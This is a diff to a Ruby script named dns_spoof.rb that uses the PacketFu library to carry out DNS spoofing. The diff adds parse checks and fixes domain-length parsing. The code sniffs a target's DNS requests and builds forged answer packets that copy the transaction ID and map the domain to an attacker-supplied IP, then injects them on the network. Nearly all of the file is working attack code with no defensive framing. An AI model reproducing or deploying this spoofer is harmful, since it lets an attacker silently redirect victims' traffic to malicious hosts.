@@ -1,13 +1,17 @@
 #!/usr/bin/ruby
+# encoding: ASCII-8BIT
 
 #Usage
 #ruby dns_spoof.rb <router> <target_ip> <sniffed_domain> <crafted_ip>
+
+
 
 require 'rubygems'
 require 'packetfu'
 require 'thread'
 require 'pry'
 include PacketFu
+
 
 #define our target and router, plus our interface
 @interface = "em1"
@@ -68,71 +72,84 @@ def spoof_dns
     puts "Waiting for incoming DNS packets..."
     iface = @interface
     capture_session = PacketFu::Capture.new(:iface => iface,:start => true,:promisc => true,:filter => "udp and port 53 and src #{@targetIP}")
-    puts "---------- captured packet -----------"
+    
     capture_session.stream.each do |p|
-        puts "udp packet on port 53 from #{@targetIP}"
-        pkt = Packet.parse(p)
-        dnsQuery = pkt.payload[2].unpack('h*')[0].chr + pkt.payload[3].unpack('h*')[0].chr
-        if dnsQuery == '10'
-            @domain = getDomain(pkt.payload[12..-1])
-            puts "DNS Request for " + @domain
-
-            #create query response (raw packets)
-            udp_pkt = UDPPacket.new(:config => @clientInfo)
-            udp_pkt.udp_src = pkt.udp_dst
-            udp_pkt.udp_dst = pkt.udp_src
-            udp_pkt.eth_daddr   = @targetMAC
-            udp_pkt.ip_daddr    = @targetIP
-            udp_pkt.ip_saddr    = pkt.ip_daddr
-            
-            
-            udp_pkt.payload     =  pkt.payload[0,2]             #DNS Transaction ID (must be same for request and response)
-            binding.pry
-            udp_pkt.payload     += "\x81"+"\x80"                #DNS Flags 10000001 10000000 (response, recursion desired, recursion available)
-            udp_pkt.payload     += "\x00"+"\x01"+"\x00"+"\x01"  #DNS 1 Question and 1 Answer RR's
-            udp_pkt.payload     += "\x00"+"\x00"+"\x00"+"\x00"  #DNS 0 Authority RR's and 0 Additional RR's
-            
-            #DNS Generate the domain name
-            @domain.split('.').each do |domainString|
-                #put length before each part of the domain
-                udp_pkt.payload += domainString.length.chr
-                #section of domain
-                udp_pkt.payload += domainString
+        puts "\n---------- captured packet -----------"
+        #puts "udp packet on port 53 from #{@targetIP}"
+        if UDPPacket.can_parse?(p) then
+            #puts "Can parse"
+            pkt = Packet.parse(p)
+            #puts "Parsed"
+            dnsQuery = pkt.payload[2].unpack('h*')[0].chr + pkt.payload[3].unpack('h*')[0].chr
+            #puts "Got flag bits"
+            if dnsQuery == '10'
+                @domain = getDomain(pkt.payload[12..-1])
+                puts "DNS Request for " + @domain
+                
+                #create query response (raw packets)
+                udp_pkt = UDPPacket.new(:config => @clientInfo)
+                udp_pkt.udp_src     = pkt.udp_dst
+                udp_pkt.udp_dst     = pkt.udp_src
+                udp_pkt.eth_daddr   = @targetMAC
+                udp_pkt.ip_daddr    = @targetIP
+                udp_pkt.ip_saddr    = pkt.ip_daddr
+                
+                udp_pkt.payload     =  pkt.payload[0,2]             #DNS Transaction ID (must be same for request and response)
+                udp_pkt.payload     += "\x81"+"\x80"                #DNS Flags 10000001 10000000 (response, recursion desired, recursion available)
+                
+                udp_pkt.payload     += "\x00"+"\x01"+"\x00"+"\x01"  #DNS 1 Question and 1 Answer RR's
+                udp_pkt.payload     += "\x00"+"\x00"+"\x00"+"\x00"  #DNS 0 Authority RR's and 0 Additional RR's
+                
+                #DNS Generate the domain name
+                @domain.split('.').each do |domainString|
+                    #put length before each part of the domain
+                    udp_pkt.payload += domainString.length.chr
+                    #section of domain
+                    udp_pkt.payload += domainString
+                end
+                
+                udp_pkt.payload     += "\x00"                       #DNS end of domain name
+                udp_pkt.payload     += "\x00"+"\x01"                #DNS Type A
+                udp_pkt.payload     += "\x00"+"\x01"                #DNS Class IN
+                
+                udp_pkt.payload     += "\xc0"+"\x0c"                #DNS Answer name
+                udp_pkt.payload     += "\x00"+"\x01"                #DNS Type A
+                udp_pkt.payload     += "\x00"+"\x01"                #DNS Class IN
+                udp_pkt.payload     += "\x00"+"\x00"+"\x02"+"\x56"  #DNS TTL (256s)
+                udp_pkt.payload     += "\x00"+"\x04"                #DNS Data Length 4
+                
+                #DNS Generate redirect IP
+                ipToSpoof = @redirectIP.split('.')
+                redirectIPHex = [ipToSpoof[0].to_i, ipToSpoof[1].to_i, ipToSpoof[2].to_i, ipToSpoof[3].to_i].pack('c*')
+                
+                udp_pkt.payload     += redirectIPHex                #DNS Address
+                
+                #recalculation of fields
+                udp_pkt.recalc
+                
+                #send to interface
+                udp_pkt.to_w(@interface);
+                puts "Sent spoofed reply addr #{@redirectIP}"
+            else
+                puts "Not DNS request"
             end
-            
-            udp_pkt.payload     += "\x00"                       #DNS end of domain name
-            udp_pkt.payload     += "\x00"+"\x01"                #DNS Type A
-            udp_pkt.payload     += "\x00"+"\x01"                #DNS Class IN
-            
-            udp_pkt.payload     += "\xc0"+"\x0c"                #DNS Answer name
-            udp_pkt.payload     += "\x00"+"\x01"                #DNS Type A
-            udp_pkt.payload     += "\x00"+"\x01"                #DNS Class IN
-            udp_pkt.payload     += "\x00"+"\x00"+"\x02"+"\x56"  #DNS TTL (256s)
-            udp_pkt.payload     += "\x00"+"\x04"                #DNS Data Length 4
-            
-            #DNS Generate redirect IP
-            ipToSpoof = @redirectIP.split('.')
-            redirectIPHex = [ipToSpoof[0].to_i, ipToSpoof[1].to_i, ipToSpoof[2].to_i, ipToSpoof[3].to_i].pack('c*')
-            udp_pkt.payload     += redirectIPHex                #DNS Address
-            
-            #recalculation of fields
-            udp_pkt.recalc
-            
-            #send to interface
-            udp_pkt.to_w(@interface);
+        else
+            puts "Cannot parse"
         end
     end
 end
 
 # Function to Get the domain name from the payload.
 def getDomain(payload)
+    #puts "getDomain()"
     domain = ""
     while(true)
-        len = payload[0].unpack('H*')[0].to_i
+        #binding.pry
+        len = payload[0].unpack('H*')[0].to_i(16)
         if (len != 0)
             domain += payload[1,len] + "."
             payload = payload[len+1..-1]
-            else
+        else
             return domain = domain[0,domain.length-1]
         end
     end
